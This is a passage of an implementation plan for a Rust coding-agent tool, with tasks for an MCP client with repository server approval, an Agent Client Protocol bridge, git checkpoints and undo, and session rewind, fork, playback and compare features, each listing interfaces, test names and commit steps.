  - `EngineBuilder` gains `approve_mcp: bool` and `client_mcp: Vec<(String, ServerSpec)>` (ACP, trusted).
  - Engine behaviour:
    - The first request waits ≤ `startup_timeout_ms` for starting servers.
    - Servers ready later, and `tools/list_changed`, apply at the next user-turn start only.
    - Stdio server env = parent env minus provider key variables (all default names plus every configured `api_key_env`) plus `env`.
    - A stdio MCP call takes a checkpoint first (Task 47).
  - CLI: `tautly mcp list`, `tautly mcp import [--from PATH]` (Claude-style `mcpServers` JSON, default `~/.claude.json`, else `./.mcp.json`; written to the user config with `toml_edit`, comments preserved), and `--approve-mcp` (this run only, never persisted).

- [ ] **Step 1: Write the failing tests.**
  - Names:
    - `names_sanitized_and_capped_at_64_with_hash`;
    - `collisions_get_distinct_names`.
  - Client:
    - `stdio_server_lists_and_calls_tools`;
    - `http_server_lists_and_calls_tools`;
    - `legacy_initialize_handshake_server_supported`;
    - `server_env_has_no_provider_keys`: with `ANTHROPIC_API_KEY` and a configured `api_key_env` set in the parent, the fixture's `env` tool reports neither;
    - `call_timeout_respected` (`timeout_s = 1`, slow tool → error result);
    - `oversized_schema_tool_skipped_with_warning`;
    - `at_most_50_tools_per_server`;
    - `description_truncated_to_1kb`;
    - `result_mapping_text_structured_image_link`;
    - `result_capped_at_30kb_with_spill`;
    - `stdio_server_killed_on_shutdown` (no fixture process remains).
  - Approvals:
    - `repo_server_not_spawned_without_approval`: interactive → `McpServerApprovalRequested` and status `AwaitingApproval`, and no process exists before `Approve`;
    - `approval_remembered_by_root_and_launch_hash`;
    - `changed_command_asks_again`;
    - `headless_repo_server_skipped_without_flag_started_with_approve_mcp_and_not_persisted`;
    - `user_server_shadows_repo_server_with_warning`;
    - `project_layer_mcp_keys_other_than_servers_dropped`;
    - `deny_lasts_for_the_session`;
    - `mcp_json_ignored_when_import_mcp_json_false`.
  - Core:
    - `mcp_tools_sorted_by_name_in_request`;
    - `mcp_call_asks_in_ask_and_auto_edit_allowed_in_yolo`;
    - `mcp_rule_by_name_glob_allows` (`allow = ["mcp__echo__*"]`);
    - `first_request_waits_up_to_startup_timeout`;
    - `late_server_joins_at_next_user_turn_once`: request 1 lacks its tools; the first request of turn 2 has them; later requests are prefix-identical;
    - `list_changed_applies_at_next_user_turn`;
    - `checkpoint_taken_before_stdio_mcp_call`;
    - `identical_failed_mcp_call_blocked`.
  - CLI:
    - `mcp_import_from_claude_json_preserves_comments`;
    - `mcp_list_shows_state_source_approval_and_tools`;
    - `doctor_reports_pending_repo_mcp_approval_as_warn`.
- [ ] **Step 2: Run** `cargo test -p tautly-mcp && cargo test -p tautly-core --test mcp && cargo test -p tautly --test mcp` — Expected: FAIL.
- [ ] **Step 3: Implement.** HTTP uses `rmcp`'s streamable-HTTP client (reqwest, rustls); its host is checked as `Network{host}` per call. Resources, prompts, sampling, elicitation, roots and OAuth are not implemented; requests for them are refused per the MCP spec.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(mcp): tools-only MCP client with repository server approval"`

### Task 46: ACP bridge `tautly acp` (execute after Task 30)

**Files:**
- Create: `crates/tautly-acp/{Cargo.toml,src/{lib.rs,bridge.rs,map.rs,permission.rs}}`
- Modify: `crates/tautly-cli/src/main.rs` (`acp` subcommand)
- Test: `crates/tautly-acp/tests/{bridge.rs,map.rs}`. They drive the bridge over an in-memory duplex with the `agent-client-protocol` crate's client side, against `MockProvider`.

**Interfaces:**
- Consumes:
  - `EngineBuilder` (+ `workspace`, `resume`, `client_mcp`, `interactive: true`).
  - `Workspace` sharing (Task 29 amendment).
  - Session rules (Task 30).
  - `DiffPreview` and pre-images (Task 42).
  - `SetModel` (Task 43).
  - `McpServerApprovalRequested` (Task 45).
  - `TurnReceipt`/evidence (Tasks 39, 44).
  - `agent-client-protocol` 1.15 (schema v1.29.1, wire `protocolVersion` 1).
- Produces:
  - `const ACP_PROTOCOL_VERSION: u16 = 1`.
  - `type AcpEngineFactory = Arc<dyn Fn(PathBuf /* root */, Option<String> /* resume */, Vec<(String, ServerSpec)>) -> Result<(Engine, mpsc::Receiver<Event>), EngineError> + Send + Sync>`.
  - `async fn serve(factory: AcpEngineFactory, input: impl AsyncRead + Unpin, output: impl AsyncWrite + Unpin) -> Result<(), AcpError>`.
  - `fn map::tool_kind(tool: &str) -> ToolKind`, per the spec 7.11.9 table.
  - `fn map::stop_reason(r: FinishReason) -> Option<StopReason>` (`Error` → `None` = JSON-RPC error).
  - `fn map::diff_content(path: &Path, old: Option<&str>, new: &str) -> Option<ToolCallContent>` (`None` when either side > 256 KB).
  - `fn map::tool_title(tool: &str, args: &Value) -> String` (`<tool>: <target>`).
  - Handled methods: `initialize` (agent capabilities `loadSession: true`, prompt `embeddedContext: true`, `image` per default model; `authMethods: []`), `session/new`, `session/load`, `session/prompt`, `session/cancel`, `session/set_config_option` (`configId: "model"`).
  - Outbound: `session/update` (`agent_message_chunk`, `agent_thought_chunk`, `tool_call`, `tool_call_update`, `usage_update`, `available_commands_update`, `notice` when the client advertises `session.notices`) and `session/request_permission`.

- [ ] **Step 1: Write the failing tests.**
  - Initialize and sessions:
    - `initialize_returns_protocol_1_and_load_session`;
    - `higher_client_version_gets_1`;
    - `session_new_uses_git_top_level_of_cwd`;
    - `missing_key_fails_session_new_with_hint`;
    - `two_sessions_share_one_workspace`;
    - `client_mcp_servers_trusted_without_approval`;
    - `session_load_replays_messages_and_tool_calls`.
  - Prompts and streaming:
    - `prompt_streams_agent_message_chunks_and_ends_end_turn`;
    - `reasoning_maps_to_thought_chunks`;
    - `tool_call_lifecycle_pending_in_progress_completed_with_kind_title_locations`;
    - `edit_result_carries_diff_content_old_new`;
    - `oversized_file_falls_back_to_unified_text`;
    - `usage_update_has_used_size_and_usd_cost`;
    - `slash_prompt_compact_maps_to_command`.
  - Permissions:
    - `ask_maps_to_request_permission_with_preview_diff`;
    - `allow_always_adds_session_rule`: the second identical call is not asked;
    - `reject_or_cancelled_outcome_denies`;
    - `memory_proposal_and_mcp_approval_use_request_permission`.
  - Cancel, stop reasons, model:
    - `cancel_answers_pending_permission_and_returns_cancelled`;
    - `stop_reason_mapping`: `max_turns` → `max_turn_requests`; budget → `end_turn` plus a notice when supported; error → JSON-RPC error;
    - `set_config_option_model_sends_set_model_and_returns_options`.
- [ ] **Step 2: Run** `cargo test -p tautly-acp` — Expected: FAIL.
- [ ] **Step 3: Implement.** Client `fs/*` and `terminal/*` are not used. The bridge never writes to stdout except protocol frames; logs go to stderr.
- [ ] **Step 4: Run** — Expected: PASS. Then a manual Zed check (`agent_servers` entry running `tautly acp`), recorded in Task 35's acceptance.
- [ ] **Step 5: Commit** `git commit -m "feat(acp): Agent Client Protocol bridge"`

### Task 47: Git checkpoints before bash and `/undo` (execute after Task 44)

**Time-travel amendment (binding, user-approved 2026-11-03; spec 7.11.11, 7.12):** these git checkpoints are the only checkpoint mechanism; time travel (Tasks 49–53) uses them. A shadow repository was rejected, because worktree forks need the commits in the user's repository.
- **Records:** use the `SessionRecord::Checkpoint { n, commit, tree, head, dirty, turn, step }` and `CheckpointSkipped` types defined in Task 48.
- **When:** take checkpoints at session start (off the startup path, after the first event), before every Exec and stdio MCP call, at every `TurnEnd`, and on request (`Checkpointer::snapshot_now`, used before rewind/switch).
- **Forks:** add `async fn Checkpointer::adopt(&self, child_session: &str, commits: &[(u32, String)]) -> Result<(), CheckpointError>`. A fork creates its own refs for every checkpoint record it copies.
- **Undo:** writes the H7 `Undone` record (Task 26).
- **Deletion:** `tautly sessions delete` keeps blobs (shared per project).
- **Tests:**
  - `checkpoints_at_session_start_and_turn_end`;
  - `adopted_refs_survive_parent_delete`.

**Files:**
- Create: `crates/tautly-core/src/checkpoint.rs`
- Modify:
  - `crates/tautly-core/src/{resume.rs,protocol.rs,engine.rs,turn.rs,record.rs}`.
  - `crates/tautly-core/src/config.rs`: `[checkpoints]`, user and CLI only.
  - `crates/tautly-cli/src/cmd/{undo.rs,sessions.rs}`.
- Test: `crates/tautly-core/tests/checkpoint.rs`, `crates/tautly-cli/tests/cli.rs` (extend)

**Interfaces:**
- Consumes:
  - `Sandbox::spawn` (Task 1).
  - `undo` (Task 26) and pre-images.
  - The write generation and watcher state (Tasks 24, 36).
  - The session records (Task 24).
- Produces:
  - `struct CheckpointConfig { enabled: bool /* true */, keep_days: u32 /* 14 */, timeout_ms: u64 /* 3000 */, max_untracked_mb: u64 /* 200 */, max_untracked_files: u64 /* 20000 */ }`, `Config.checkpoints`.
  - `struct Checkpointer`:
    - `fn new(sb: Arc<dyn Sandbox>, root: PathBuf, session: String, cfg: CheckpointConfig) -> Option<Checkpointer>` (`None` when not a git work tree, git is missing, or the tree is bare).
    - `async fn snapshot(&mut self, write_gen: u64, watcher_changed: bool) -> Result<CheckpointRef, Skip>`. Every git call has `GIT_INDEX_FILE=<temp>`, `-c core.fsmonitor=false -c core.hooksPath=/dev/null` and a `timeout_ms` deadline. An unchanged tree reuses the previous checkpoint.
    - `async fn restore(&self, commit: &str, dry_run: bool) -> Result<RestorePlan, CheckpointError>`
    - `async fn backup(&mut self) -> Result<CheckpointRef, Skip>` (`undo-<n>` ref)
  - `struct CheckpointRef { n: u32, commit: String, refname: String }`, `enum Skip { NoGit, Timeout, TooManyUntracked { files: u64, bytes: u64 }, Git(String) }`, `struct RestorePlan { restored: Vec<PathBuf>, deleted: Vec<PathBuf> }`.
  - `async fn checkpoint::prune(sb: &dyn Sandbox, root: &Path, keep_days: u32) -> Result<u32, CheckpointError>` (engine start) and `async fn checkpoint::delete_session_refs(sb: &dyn Sandbox, root: &Path, session: &str) -> Result<u32, CheckpointError>`.
  - Session records `SessionRecord::Checkpoint { n, commit, tree, head, dirty, turn, step }` and `SessionRecord::CheckpointSkipped { reason, turn, step }` (types from Task 48). A skip also emits a `Warning` `checkpoint skipped: <reason>`.
  - Wire additions:
    - `Command::Undo { turn: Option<u32>, dry_run: bool }`
    - `Event::Undone { turn: u32, restored: Vec<String>, deleted: Vec<String>, dry_run: bool, backup_ref: Option<String>, note: Option<String> }`
  - `undo` changes to user-turn units: `fn undo(reader: &SessionReader<SessionRecord>, sandbox: &dyn Sandbox, cp: Option<&mut Checkpointer>, turn: Option<u32>, dry_run: bool) -> Result<UndoReport, UndoError>`.
    - It walks the turn's `Edit` and `Checkpoint` records in reverse, taking a backup snapshot first.
    - `note` = `"ignored files and submodules are not restored"` when the turn ran commands in git, or `"command side effects not undone (not a git repository)"` outside git.
    - `tautly undo [--turn N]` and `/undo` use it.
  - `tautly sessions delete <id>` removes the log and its refs; blobs are shared and kept.

- [ ] **Step 1: Write the failing tests** (temporary git repos):
  - Snapshots:
    - `checkpoint_leaves_index_head_stash_and_branches_untouched`: with a staged change and a stash entry, `.git/index` bytes, `rev-parse HEAD`, `stash list` and `for-each-ref refs/heads` are identical afterwards;
    - `checkpoint_includes_untracked_and_excludes_ignored`;
    - `unborn_head_repo_checkpoints`;
    - `hooks_and_fsmonitor_never_run`: a repo `core.fsmonitor` script and `.git/hooks/*` scripts would touch a marker, and the marker is absent;
    - `unchanged_tree_reuses_previous_checkpoint`;
    - `timeout_skips_with_warning`: a `PATH` shim makes `git` sleep;
    - `untracked_limits_skip_with_warning`;
    - `project_layer_cannot_disable_checkpoints`.
  - Undo:
    - `non_git_dir_has_no_checkpointer_and_undo_notes_it`;
    - `undo_reverts_bash_side_effects`: after `sed -i` on a tracked file and `touch new.txt`, undo restores the file and deletes `new.txt`, and the ignored `target/x` is untouched;
    - `undo_combines_preimages_and_checkpoints_in_reverse`: edit A, then bash changes A and B, then edit B; undo returns both to the turn start;
    - `undo_dry_run_changes_nothing_and_lists_paths`;
    - `undo_takes_backup_ref_first`: a concurrent user change can be recovered from `backup_ref`;
    - `undo_default_is_last_user_turn_and_cli_uses_same_numbering`.
  - Pruning and deletion:
    - `refs_older_than_keep_days_pruned_at_engine_start` (`GIT_COMMITTER_DATE` in the past);
    - `sessions_delete_removes_log_and_refs_keeps_shared_blobs`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test checkpoint && cargo test -p tautly --test cli` — Expected: FAIL.
- [ ] **Step 3: Implement.**
  - Snapshot: `read-tree HEAD` (or `read-tree --empty`), `add -A`, `write-tree`, `commit-tree -p <prev|HEAD>`, `update-ref`.
  - Restore: `checkout <commit> -- <paths>` under the temp index; added paths are deleted through the sandbox.
  - The untracked pre-check is `ls-files --others --exclude-standard -z` with sizes from `metadata`.
  - The checkpoint runs inside the `Exec` barrier (Checkpoint 2 ordering), before the call starts. Its time is counted in the call's duration.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): git checkpoints before bash and user-turn undo"`

---

## Time travel core (user-approved 2026-11-03; spec 6.5 hooks, 7.12)

Task 48 runs before Task 26. Tasks 49–53 run after Task 46 and before checkpoint 5 (see **Execution Order**). All of them use the single checkpoint mechanism of Task 47, the `state_at` and `expected_tip` rules of spec 7.12.1, and the rule that logged approvals are never consent.

### Task 48: Session-format hooks H1–H10 (execute before Task 26)

**Files:**
- Modify:
  - `crates/tautly-session/src/{record.rs,writer.rs,reader.rs,paths.rs,lib.rs}`.
  - `crates/tautly-core/src/{record.rs,session.rs,turn.rs,engine.rs,approvals.rs,dispatch.rs}`.
  - `crates/tautly-memory/src/episodes.rs` (project id), `crates/tautly-core/src/ledger.rs` (project column = project id).
- Test: `crates/tautly-session/tests/hooks.rs`, `crates/tautly-core/tests/session_hooks.rs`

**Interfaces:**
- Consumes: `SessionWriter`, `SessionReader`, `Header` (Task 18); `SessionRecord`, `PersistedEffect` (Task 24); `Context` blocks (Task 19); `agents_md`, `repo_map` (Tasks 19, 38).
- Produces:
  - **H1 timestamp.** The envelope is `{"type":"record","offset":n,"t":<unix ms>,"data":…}`. `SessionReader::entries(&self) -> impl Iterator<Item = Result<Entry<R>>>`, with `struct Entry<R> { offset: u64, t_ms: u64, rec: R }`. `records()` stays. A missing `t` reads as 0.
  - **H3 header.**
    - `Header` gains (all `#[serde(default)]`): `project: String`, `label: Option<String>`, `origin: Origin`, `git: Option<GitState>`, `tautly_version: String`, `model: Option<String>`, `config_hash: Option<String>`, `tags: Vec<String>`.
    - `enum Origin { User, Fork, Rewind, WhatIf, Eval, Import, #[serde(other)] Unknown }` (default `User`); `struct GitState { head: Option<String>, dirty: Option<bool> }`.
    - `struct HeaderInit { parent: Option<(String, u64)>, label: Option<String>, origin: Origin, model: Option<String>, config_hash: Option<String>, tags: Vec<String> }`, taken by `SessionWriter::create_in(data_home, root, init)`.
    - `fn git_head(root: &Path) -> Option<String>` reads `.git`, `HEAD`, loose refs and `packed-refs` (worktree `gitdir:` files included) without spawning git.
  - **H10 project id.** `fn project_id(root: &Path) -> String` = blake3 hex of the canonical git common dir (resolved from `.git` / `gitdir:` / `commondir` files), else of the canonical root. It is used for session dirs, blobs, episodes and the ledger project column. `project_hash(root)` stays for the index only.
  - **H2 root-relative paths.** `#[derive(Serialize, Deserialize)] struct RelPath(String)` with:
    - `fn from_abs(root: &Path, p: &Path) -> Option<RelPath>`;
    - `fn resolve(&self, root: &Path) -> Result<PathBuf, ConfineError>`, which refuses absolute paths, `..` components, NUL and empty paths.

    It is used in `PersistedEffect`, `Edit`, `GcApplied.forgotten_paths` and `Undone`. Non-UTF-8 paths keep the existing skip-with-warning rule.
  - **H5.** `SessionRecord::PrefixApplied { agents_md: Option<BlobRef>, repo_map: Option<BlobRef>, system_prompt_hash: String, tools_hash: String }`. Written before the first `Request` and before any `Request` whose inputs differ from the last `PrefixApplied`.
  - **H6.** `SessionRecord::Request { hash: BlobRef, turn: u32, step: u32, model: ModelId, blocks: BlockHashes }`, with `struct BlockHashes { stable: String, pinned: String, history: String, tail: String }` (blake3 hex of each block's canonical serialization).
  - **H7.**
    - `post_image_blob: Option<BlobRef>` is added to `PersistedEffect::Edited` and to `SessionRecord::Edit { path: RelPath, pre_image: Option<BlobRef>, post_image_blob: Option<BlobRef>, turn: u32 }`.
    - `SessionRecord::Undone { turn: u32, files: Vec<UndoneFile>, backup_ref: Option<String> }`, with `struct UndoneFile { path: RelPath, from_blob: Option<BlobRef>, to: Option<BlobRef> }`. The type lands here; Task 26 writes it.
  - **H8.** `SessionRecord::ApprovalRequested { request_id: String, kind: ApprovalKind, call_id: Option<String>, reason: String }`, with `enum ApprovalKind { Tool, McpServer, Memory }`. It is appended before the matching event is emitted.
  - **Checkpoint record types** (written by Task 47): `SessionRecord::Checkpoint { n: u32, commit: String, tree: String, head: Option<String>, dirty: bool, turn: u32, step: u32 }` and `SessionRecord::CheckpointSkipped { reason: String, turn: u32, step: u32 }`.
  - **Labels.** `SessionRecord::Labeled { label: String }`.

- [ ] **Step 1: Write the failing tests.**
  - Session:
    - `every_record_line_has_unix_ms_timestamp`;
    - `line_without_t_reads_as_zero`;
    - `header_carries_project_label_origin_git_version_model_config_hash_tags`;
    - `old_header_without_new_fields_reads_with_defaults`;
    - `relpath_rejects_absolute_dotdot_nul_and_empty`;
    - `relpath_written_under_one_root_resolves_under_another`;
    - `worktree_sessions_share_project_id_and_blob_dir` (`git worktree add`);
    - `non_git_project_id_is_root_hash`;
    - `git_head_read_from_files_for_branch_detached_packed_refs_and_worktree` (no `git` on `PATH` during the test).
  - Core:
    - `prefix_applied_logged_before_first_request_with_agents_md_and_repo_map_blobs`;
    - `prefix_applied_relogged_only_when_inputs_change`;
    - `request_record_has_turn_step_model_and_block_hashes`: `stable` is identical across requests while the prefix is unchanged;
    - `edit_records_carry_post_image_equal_to_disk`;
    - `approval_request_logged_with_call_id_before_event`;
    - `persisted_paths_are_root_relative`;
    - `config_hash_stable_for_identical_config`;
    - `labeled_record_renames_session`.
- [ ] **Step 2: Run** `cargo test -p tautly-session --test hooks && cargo test -p tautly-core --test session_hooks` — Expected: FAIL.
- [ ] **Step 3: Implement.** Post-image blobs are written on the same blocking path as other blobs; they dedupe with the next pre-image. Keep `SCHEMA_VERSION = 1`, since schema 1 is unreleased. Update every existing test that builds a `Header` or reads absolute record paths.
- [ ] **Step 4: Run** `cargo test --workspace` — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(session): time-travel hooks — timestamps, relative paths, header, prefix inputs, post-images"`

### Task 49: Rewind as fork, session tree, switching (execute after Task 46)

**Files:**
- Create: `crates/tautly-core/src/{timetravel.rs,lease.rs,tree.rs}`
- Modify:
  - `crates/tautly-core/src/{protocol.rs,engine.rs,resume.rs,checkpoint.rs}`.
  - `crates/tautly-rpc/src/server.rs`: `session/tree`, and the `rewind`, `switch`, `label` methods.
  - `crates/tautly-tui/src/slash.rs`: `/rewind`, `/tree`, `/switch`, `/label`.
  - `crates/tautly-cli/src/cmd/sessions.rs`: `sessions tree`.
- Test: `crates/tautly-core/tests/timetravel.rs`, `crates/tautly-rpc/tests/server.rs` (extend), `crates/tautly-tui/tests/repl.rs` (extend)

**Interfaces:**
- Consumes: `rebuild(reader, until)` and `Fork{at, label}` (Task 26); `Checkpointer::{snapshot_now, restore, backup, adopt}` (Task 47); Task 48 records.
- Produces:
  - `struct FileState { base: Option<String /* checkpoint commit */>, overlay: Vec<(RelPath, Option<BlobRef>)>, partial: Option<String> }`.
  - `fn timetravel::state_at(reader: &SessionReader<SessionRecord>, at: u32) -> Result<FileState, TtError>`. It takes the earliest checkpoint after step `at`, then reverse-applies `Edit` pre-images and `Undone.from_blob` between the boundary and that checkpoint. With no such checkpoint, or a skipped one, it is `partial`.
  - `fn timetravel::expected_tip(reader: &SessionReader<SessionRecord>) -> Result<FileState, TtError>`.
  - `async fn timetravel::materialize(sb: &dyn Sandbox, cp: Option<&mut Checkpointer>, target: &FileState, expected: &FileState, overwrite: &[RelPath], dry_run: bool) -> Result<MaterializeReport, TtError>`. It changes only paths where the target differs from `expected`. A path that would change and whose disk content ≠ `expected` is a conflict, which aborts unless listed in `overwrite`. It takes a backup before any write.
  - `#[derive(Serialize, Deserialize)] struct MaterializeReport { restored: Vec<String>, deleted: Vec<String>, conflicts: Vec<String>, dry_run: bool, applied: bool, backup_ref: Option<String>, note: Option<String> }`.
  - `struct Lease` with `fn shared(data_home: &Path, root: &Path) -> io::Result<Lease>` (held by every engine) and `fn try_exclusive(&self) -> Result<ExclusiveGuard, LeaseError>` (`flock`; it also fails while another live session in this process shares the `Workspace`).
  - Wire additions:
    - `Command::Rewind { at: u32, label: Option<String>, dry_run: bool, #[serde(default)] overwrite: Vec<String> }` → `Event::Rewound { at: u32, branch: String, report: MaterializeReport }`, then `SessionChanged` when applied.
    - `Command::Switch { session_id: String, dry_run: bool, #[serde(default)] overwrite: Vec<String> }` → `Event::Switched { branch: String, report: MaterializeReport }`, then `SessionChanged`.
    - `Command::Label { label: String }` appends `Labeled`.
  - `struct TreeNode { session_id: String, parent: Option<(String, u32)>, label: Option<String>, origin: Origin, created: u64, steps: u32, last_prompt: String, cost_usd: Option<f64>, live: bool, current: bool }` and `fn tree::build(data_home: &Path, project: &str, current: Option<&str>) -> Result<Vec<TreeNode>, TtError>`. RPC `session/tree {root}` returns `{nodes}`.
  - REPL:
    - `/rewind N`: dry run, show restored/deleted/conflicts, `y` applies. With conflicts it asks `overwrite N files you changed? (backup kept)`, then sends `overwrite`.
    - `/tree` prints `* <label|id8>  step N · <origin> · $cost · <last prompt 40 chars>`, indented per depth.
    - `/switch <label|id|n>` and `/label <name>`.
  - CLI: `tautly sessions tree`.

- [ ] **Step 1: Write the failing tests.**
  - File states:
    - `state_at_uses_earliest_checkpoint_after_and_reverts_tool_edits`;
    - `state_at_with_skipped_checkpoint_is_partial`.
  - Rewind:
    - `rewind_creates_branch_and_leaves_old_log_unmodified_except_tip_checkpoint`;
    - `rewind_restores_tool_and_bash_changes`;
    - `rewind_conflict_on_human_edit_writes_nothing_and_creates_no_branch`;
    - `rewind_overwrite_list_applies_with_backup_ref`;
    - `human_edit_outside_changed_paths_left_alone`;
    - `human_added_file_not_deleted_without_overwrite`;
    - `context_after_rewind_equals_rebuild_until`;
    - `non_git_rewind_restores_tool_edits_and_notes_commands`.
  - Switch and lease:
    - `switch_back_and_forth_restores_each_tip_exactly`;
    - `rewind_and_switch_refused_while_lease_shared_elsewhere` (a second engine on the same root);
    - `fork_children_own_checkpoint_refs`: delete the parent and the child still materializes.
  - Tree, labels and clients:
    - `label_command_renames_branch`;
    - `tree_lists_parent_step_label_origin_live_current`;
    - `rpc_session_tree_and_rewind_methods`;
    - `repl_rewind_dry_run_then_apply_and_tree_switch_label`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test timetravel && cargo test -p tautly-rpc && cargo test -p tautly-tui` — Expected: FAIL.
- [ ] **Step 3: Implement.** Order within a rewind:
  1. Exclusive lease.
  2. Tip checkpoint of the current session.
  3. Compute target and expected.
  4. Dry-run report. When it is not a dry run and there are no unlisted conflicts: backup, materialize, create the branch log (Task 26 fork, with origin `rewind`), adopt checkpoint refs, rebuild the context, `SessionChanged`.

  A failure after materializing restores from the backup.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core): rewind as fork, session tree and branch switching"`

### Task 50: Fork at step N into an isolated worktree (execute after Task 49)

**Files:**
- Create: `crates/tautly-core/src/worktree.rs`, `crates/tautly-cli/src/cmd/fork.rs`
- Modify: `crates/tautly-rpc/src/server.rs` (`session/new {fork: {session_id, at, label, worktree, model}}`), `crates/tautly-cli/src/cmd/sessions.rs` (delete removes the fork worktree)
- Test: `crates/tautly-core/tests/worktree_fork.rs`, `crates/tautly-cli/tests/fork.rs`

**Interfaces:**
- Consumes: `state_at` (Task 49); `Fork` copy and `adopt` (Tasks 26, 47); `SetModel` (Task 43); headless rules (Task 29).
- Produces:
  - `async fn worktree::create(sb: &dyn Sandbox, repo_root: &Path, state: &FileState, dir: &Path) -> Result<PathBuf, WtError>`: `git -c core.hooksPath=/dev/null worktree add --detach <dir> <base>`, then writes the overlay. A non-git root or a missing base gives `WtError::NotGit` or `WtError::Partial`.
  - `fn fork_into(reader: &SessionReader<SessionRecord>, at: u32, new_root: &Path, label: Option<String>, origin: Origin, model: Option<ModelId>) -> Result<String /* session id */, WtError>`: records up to step `at` copied verbatim, header `root` = `new_root`, same `project` id.
  - CLI: `tautly fork <session> --at N [--model M] [--prompt TEXT] [--label L] [--dir PATH] [--approve auto-edit|yolo] [--budget-usd N] [--output json|text]`.
    - The default dir is `<data home>/worktrees/<project-id>/<session-id>`.
    - Without `--prompt` it prints `worktree: <path>  session: <id>  resume: cd <path> && tautly --resume <id>`.
    - With `--prompt` it runs `run_oneshot` in the worktree under the headless rules and exits with the same codes as `tautly -p`.
  - `tautly sessions delete <fork>` runs `git worktree remove` on a clean worktree. A dirty one is refused unless `--force`.

- [ ] **Step 1: Write the failing tests:**
  - `fork_at_n_creates_worktree_with_state_at_n_and_original_tree_and_index_untouched`;
  - `fork_session_has_parent_origin_what_if_and_records_up_to_n`;
  - `fork_shares_blob_dir_with_parent`;
  - `model_override_applied_before_first_message`;
  - `prompt_runs_headless_in_worktree_only`;
  - `logged_approvals_are_not_consent`: the parent approved `bash x`, and in the fork without `--approve` the same call is denied;
  - `worktree_hooks_not_run`;
  - `non_git_root_refuses`;
  - `partial_state_refused_with_note`;
  - `sessions_delete_removes_clean_worktree_refuses_dirty_without_force`;
  - `rpc_session_new_fork_worktree`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test worktree_fork && cargo test -p tautly --test fork` — Expected: FAIL.
- [ ] **Step 3: Implement.** The new worktree builds its own index in the background (index keyed by root). The fork never inherits session rules or pending approvals.
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core,cli): fork at a step into an isolated git worktree"`

### Task 51: Playback (execute after Task 50)

**Files:**
- Create: `crates/tautly-core/src/replay.rs`, `crates/tautly-cli/src/cmd/replay.rs`
- Modify: `crates/tautly-core/src/{protocol.rs,engine.rs}`, `crates/tautly-tui/src/render.rs` (render `Replayed` and `UserMessage`), `crates/tautly-rpc/src/server.rs` (`replay` method)
- Test: `crates/tautly-core/tests/replay.rs`, `crates/tautly-cli/tests/replay.rs`

**Interfaces:**
- Consumes: `SessionReader::entries` (Task 48); the record set of Tasks 24, 28, 43, 48.
- Produces:
  - `fn replay::events(reader: &SessionReader<SessionRecord>, from_step: Option<u32>) -> impl Iterator<Item = (u64 /* offset */, u64 /* t_ms */, Event)>`, using the mapping in spec 7.12.5.
  - Wire additions:
    - `Command::Replay { session_id: Option<String>, speed: f32, from_step: Option<u32> }` (idle only, else `Error{kind: Internal, message: "replay needs an idle session"}`).
    - `Event::Replayed { offset: u64, t_ms: u64, event: Box<Event> }`, `Event::ReplayFinished { session_id: String, events: u32, cancelled: bool }`.
    - `Event::UserMessage { text: String }` (emitted only inside `Replayed`).
  - Pacing: sleep `min((t_i − t_{i−1}) / speed, 2 s)`; `speed == 0.0` means none. `Cancel` stops playback.
  - CLI: `tautly replay <session> [--speed X (default 1)] [--from-step N] [--output text|json]`. Text output uses the REPL renderer; json prints inner events as NDJSON. No provider is built and no key is needed.

- [ ] **Step 1: Write the failing tests:**
  - `replay_reemits_logged_stream_in_order`: golden check against the live stream of a scripted mock session, modulo merged deltas and approval `diff`;
  - `replay_makes_no_provider_requests_or_spawns` (`MockProvider.requests()` is empty; the sandbox spawn counter is 0);
  - `replay_paces_by_timestamps_scaled_and_capped_at_2s` (`tokio::time::pause`);
  - `speed_zero_is_instant`;
  - `from_step_skips_earlier_steps`;
  - `cancel_stops_with_finished_cancelled`;
  - `replay_during_turn_errors`;
  - `replayed_request_ids_not_answerable`;
  - `cli_replay_without_api_key`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test replay && cargo test -p tautly --test replay` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
- [ ] **Step 5: Commit** `git commit -m "feat(core,cli): session playback"`

### Task 52: Compare (execute after Task 51)

**Files:**
- Create: `crates/tautly-core/src/compare.rs`, `crates/tautly-cli/src/cmd/compare.rs`
- Test: `crates/tautly-core/tests/compare.rs`, `crates/tautly-cli/tests/compare.rs` (insta golden)

**Interfaces:**
- Consumes: `Ledger::session_totals` (Task 26 note); `TestEvidence` (Task 44); `session_diff` (Task 42); header parents (Task 48).
- Produces:
  - `struct BranchSummary { session_id: String, label: Option<String>, models: Vec<ModelId>, user_turns: u32, steps: u32, tokens_in: u64, tokens_out: u64, cache_read: u64, cost_usd: Option<f64>, wall_ms: u64, tool_calls: u32, blocked: u32, edit_failures: u32, evidence: Option<TestEvidence>, files: BTreeSet<String>, added: u32, removed: u32 }`.
  - `fn compare::fork_point(a: &Header, b: &Header, data_home: &Path) -> Option<(String, u32)>` (walks parent chains).
  - `fn compare::summarize(reader: &SessionReader<SessionRecord>, ledger: Option<&Ledger>, from_step: Option<u32>) -> Result<BranchSummary, CompareError>`.
    - Wall time = Σ(`TurnEnd.t` − `SendMessage.t`).
    - Cost comes from the ledger by session, falling back to logged usage.
    - Diff stat = the net change since `from_step`.
  - CLI: `tautly compare <a> <b> [<c>…] [--json]`, with 2–5 sessions (more is an error), one column per session plus a files table `only <x> | both`.

- [ ] **Step 1: Write the failing tests:**
  - `compare_two_branches_from_common_fork_point_golden`;
  - `figures_count_from_fork_point_not_shared_prefix`;
  - `files_overlap_sets`;
  - `evidence_row_shows_last_test_and_stale`;
  - `cost_from_ledger_includes_discarded_attempts_else_logged_usage`;
  - `unrelated_sessions_compared_whole`;
  - `more_than_five_sessions_rejected`;
  - `json_shape`.
- [ ] **Step 2: Run** `cargo test -p tautly-core --test compare && cargo test -p tautly --test compare` — Expected: FAIL.
- [ ] **Step 3: Implement.**
- [ ] **Step 4: Run** — Expected: PASS.
